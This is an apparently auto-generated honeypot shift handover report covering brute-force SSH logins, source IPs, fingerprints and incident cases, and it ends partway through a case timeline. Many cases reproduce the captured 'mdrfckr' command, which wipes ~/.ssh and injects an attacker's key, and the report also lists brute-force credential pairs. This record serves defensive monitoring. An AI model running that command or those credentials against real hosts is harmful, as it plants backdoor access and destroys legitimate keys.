# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-17 |
| **Generated At** | 2026-05-17T13:28:42Z |
| **Shift Time** | 13:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **607** |
| Confirmed Threats | **597** |
| False Positives Filtered | **10** (1.7%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **11** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **579** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **51** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **12** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 13 |
| `techuser` | 1 |
| `furukawa` | 1 |
| `yasin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 14 |
| `345gs5662d34` | 13 |
| `1qaz#EDC` | 1 |
| `Tech$123` | 1 |
| `aaaqqq` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 14 |
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `1qaz#EDC` | 1 |
| `techuser` | `Tech$123` | 1 |
| `root` | `aaaqqq` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qaz#EDC` | `120.196.66.80` | 2026-05-17T11:13:07 |
| `root` | `3245gs5662d34` | `120.196.66.80` | 2026-05-17T11:13:17 |
| `root` | `aaaqqq` | `40.82.214.8` | 2026-05-17T12:06:31 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-05-17T12:06:37 |
| `root` | `zaq12wsx` | `40.82.214.8` | 2026-05-17T12:10:33 |
| `root` | `Sf123456` | `40.82.214.8` | 2026-05-17T12:12:38 |
| `root` | `123P@ssw0rd` | `40.82.214.8` | 2026-05-17T12:16:32 |
| `root` | `hw@123456` | `40.82.214.8` | 2026-05-17T12:18:28 |
| `root` | `qweqweqwe` | `40.82.214.8` | 2026-05-17T12:22:38 |
| `root` | `Aa987654321` | `40.82.214.8` | 2026-05-17T12:24:38 |
| `root` | `Vps@2026` | `40.82.214.8` | 2026-05-17T12:26:38 |
| `root` | `root2023!@#` | `40.82.214.8` | 2026-05-17T12:28:31 |
| `root` | `.` | `40.82.214.8` | 2026-05-17T12:30:25 |
| `root` | `123456QWE` | `40.82.214.8` | 2026-05-17T12:32:19 |
| `root` | `Baidu@123` | `40.82.214.8` | 2026-05-17T12:40:11 |
| `root` | `asdasd1` | `40.82.214.8` | 2026-05-17T12:42:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **607** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 53 |
| Unknown | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 49 | 3 |
| `03a80b21afa8...` | Modern SSH client | 4 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 49 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 4 | 1 | Modern SSH client |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.196.66.80`, `40.82.214.8`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **18** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS201746` | Olivenet Network S.L. | 1 | MEDIUM |
| `AS27988` | Servicios y Telecomunicaciones S.A. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e6bec6f11820

| Field | Detail |
|---|---|
| **Source IP** | `120.196.66[.]80` |
| **First Seen** | 2026-05-17 11:13 |
| **Last Seen** | 2026-05-17 11:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 11:13:06` | `cowrie.session.connect` |
| `2026-05-17 11:13:06` | `cowrie.client.version` |
| `2026-05-17 11:13:06` | `cowrie.client.kex` |
| `2026-05-17 11:13:07` | `cowrie.login.success` |
| `2026-05-17 11:13:08` | `cowrie.session.params` |
| `2026-05-17 11:13:08` | `cowrie.command.input` |
| `2026-05-17 11:13:08` | `cowrie.command.failed` |
| `2026-05-17 11:13:08` | `cowrie.log.closed` |
| `2026-05-17 11:13:09` | `cowrie.session.params` |
| `2026-05-17 11:13:09` | `cowrie.command.input` |
| `2026-05-17 11:13:09` | `cowrie.session.file_download` |
| `2026-05-17 11:13:09` | `cowrie.log.closed` |
| `2026-05-17 11:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.196.66[.]80` to AbuseIPDB if not already reported
- [ ] Block `120.196.66[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c7f11142934

| Field | Detail |
|---|---|
| **Source IP** | `120.196.66[.]80` |
| **First Seen** | 2026-05-17 11:13 |
| **Last Seen** | 2026-05-17 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 11:13:16` | `cowrie.session.connect` |
| `2026-05-17 11:13:16` | `cowrie.client.version` |
| `2026-05-17 11:13:16` | `cowrie.client.kex` |
| `2026-05-17 11:13:17` | `cowrie.login.success` |
| `2026-05-17 11:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.196.66[.]80` to AbuseIPDB if not already reported
- [ ] Block `120.196.66[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19f166141a6

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:06 |
| **Last Seen** | 2026-05-17 12:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:06:29` | `cowrie.session.connect` |
| `2026-05-17 12:06:30` | `cowrie.client.version` |
| `2026-05-17 12:06:30` | `cowrie.client.kex` |
| `2026-05-17 12:06:31` | `cowrie.login.success` |
| `2026-05-17 12:06:31` | `cowrie.session.params` |
| `2026-05-17 12:06:31` | `cowrie.command.input` |
| `2026-05-17 12:06:31` | `cowrie.command.failed` |
| `2026-05-17 12:06:32` | `cowrie.log.closed` |
| `2026-05-17 12:06:32` | `cowrie.session.params` |
| `2026-05-17 12:06:32` | `cowrie.command.input` |
| `2026-05-17 12:06:32` | `cowrie.session.file_download` |
| `2026-05-17 12:06:32` | `cowrie.log.closed` |
| `2026-05-17 12:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51b8619fb06d

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:06 |
| **Last Seen** | 2026-05-17 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:06:35` | `cowrie.session.connect` |
| `2026-05-17 12:06:36` | `cowrie.client.version` |
| `2026-05-17 12:06:36` | `cowrie.client.kex` |
| `2026-05-17 12:06:37` | `cowrie.login.success` |
| `2026-05-17 12:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3979ac534992

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:10 |
| **Last Seen** | 2026-05-17 12:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:10:31` | `cowrie.session.connect` |
| `2026-05-17 12:10:31` | `cowrie.client.version` |
| `2026-05-17 12:10:32` | `cowrie.client.kex` |
| `2026-05-17 12:10:33` | `cowrie.login.success` |
| `2026-05-17 12:10:34` | `cowrie.session.params` |
| `2026-05-17 12:10:34` | `cowrie.command.input` |
| `2026-05-17 12:10:34` | `cowrie.command.failed` |
| `2026-05-17 12:10:34` | `cowrie.log.closed` |
| `2026-05-17 12:10:35` | `cowrie.session.params` |
| `2026-05-17 12:10:35` | `cowrie.command.input` |
| `2026-05-17 12:10:35` | `cowrie.session.file_download` |
| `2026-05-17 12:10:35` | `cowrie.log.closed` |
| `2026-05-17 12:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a7965f268b3

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:10 |
| **Last Seen** | 2026-05-17 12:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:10:38` | `cowrie.session.connect` |
| `2026-05-17 12:10:38` | `cowrie.client.version` |
| `2026-05-17 12:10:38` | `cowrie.client.kex` |
| `2026-05-17 12:10:41` | `cowrie.login.success` |
| `2026-05-17 12:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a476053a95b9

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:12 |
| **Last Seen** | 2026-05-17 12:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:12:36` | `cowrie.session.connect` |
| `2026-05-17 12:12:36` | `cowrie.client.version` |
| `2026-05-17 12:12:36` | `cowrie.client.kex` |
| `2026-05-17 12:12:38` | `cowrie.login.success` |
| `2026-05-17 12:12:38` | `cowrie.session.params` |
| `2026-05-17 12:12:38` | `cowrie.command.input` |
| `2026-05-17 12:12:38` | `cowrie.command.failed` |
| `2026-05-17 12:12:38` | `cowrie.log.closed` |
| `2026-05-17 12:12:39` | `cowrie.session.params` |
| `2026-05-17 12:12:39` | `cowrie.command.input` |
| `2026-05-17 12:12:39` | `cowrie.session.file_download` |
| `2026-05-17 12:12:39` | `cowrie.log.closed` |
| `2026-05-17 12:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1153062f23c3

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:12 |
| **Last Seen** | 2026-05-17 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:12:41` | `cowrie.session.connect` |
| `2026-05-17 12:12:41` | `cowrie.client.version` |
| `2026-05-17 12:12:42` | `cowrie.client.kex` |
| `2026-05-17 12:12:43` | `cowrie.login.success` |
| `2026-05-17 12:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538afd24bccf

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:16 |
| **Last Seen** | 2026-05-17 12:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:16:31` | `cowrie.session.connect` |
| `2026-05-17 12:16:31` | `cowrie.client.version` |
| `2026-05-17 12:16:31` | `cowrie.client.kex` |
| `2026-05-17 12:16:32` | `cowrie.login.success` |
| `2026-05-17 12:16:33` | `cowrie.session.params` |
| `2026-05-17 12:16:33` | `cowrie.command.input` |
| `2026-05-17 12:16:33` | `cowrie.command.failed` |
| `2026-05-17 12:16:33` | `cowrie.log.closed` |
| `2026-05-17 12:16:33` | `cowrie.session.params` |
| `2026-05-17 12:16:33` | `cowrie.command.input` |
| `2026-05-17 12:16:33` | `cowrie.session.file_download` |
| `2026-05-17 12:16:33` | `cowrie.log.closed` |
| `2026-05-17 12:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290ff605aff0

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:16 |
| **Last Seen** | 2026-05-17 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:16:37` | `cowrie.session.connect` |
| `2026-05-17 12:16:37` | `cowrie.client.version` |
| `2026-05-17 12:16:37` | `cowrie.client.kex` |
| `2026-05-17 12:16:38` | `cowrie.login.success` |
| `2026-05-17 12:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca66082c9b4

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:18 |
| **Last Seen** | 2026-05-17 12:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:18:27` | `cowrie.session.connect` |
| `2026-05-17 12:18:27` | `cowrie.client.version` |
| `2026-05-17 12:18:27` | `cowrie.client.kex` |
| `2026-05-17 12:18:28` | `cowrie.login.success` |
| `2026-05-17 12:18:28` | `cowrie.session.params` |
| `2026-05-17 12:18:28` | `cowrie.command.input` |
| `2026-05-17 12:18:28` | `cowrie.command.failed` |
| `2026-05-17 12:18:29` | `cowrie.log.closed` |
| `2026-05-17 12:18:29` | `cowrie.session.params` |
| `2026-05-17 12:18:29` | `cowrie.command.input` |
| `2026-05-17 12:18:30` | `cowrie.session.file_download` |
| `2026-05-17 12:18:30` | `cowrie.log.closed` |
| `2026-05-17 12:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-408727021238

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:18 |
| **Last Seen** | 2026-05-17 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:18:34` | `cowrie.session.connect` |
| `2026-05-17 12:18:34` | `cowrie.client.version` |
| `2026-05-17 12:18:34` | `cowrie.client.kex` |
| `2026-05-17 12:18:35` | `cowrie.login.success` |
| `2026-05-17 12:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b1031301759

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:22 |
| **Last Seen** | 2026-05-17 12:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:22:33` | `cowrie.session.connect` |
| `2026-05-17 12:22:33` | `cowrie.client.version` |
| `2026-05-17 12:22:33` | `cowrie.client.kex` |
| `2026-05-17 12:22:38` | `cowrie.login.success` |
| `2026-05-17 12:22:39` | `cowrie.session.params` |
| `2026-05-17 12:22:39` | `cowrie.command.input` |
| `2026-05-17 12:22:39` | `cowrie.command.failed` |
| `2026-05-17 12:22:40` | `cowrie.log.closed` |
| `2026-05-17 12:22:40` | `cowrie.session.params` |
| `2026-05-17 12:22:40` | `cowrie.command.input` |
| `2026-05-17 12:22:40` | `cowrie.session.file_download` |
| `2026-05-17 12:22:40` | `cowrie.log.closed` |
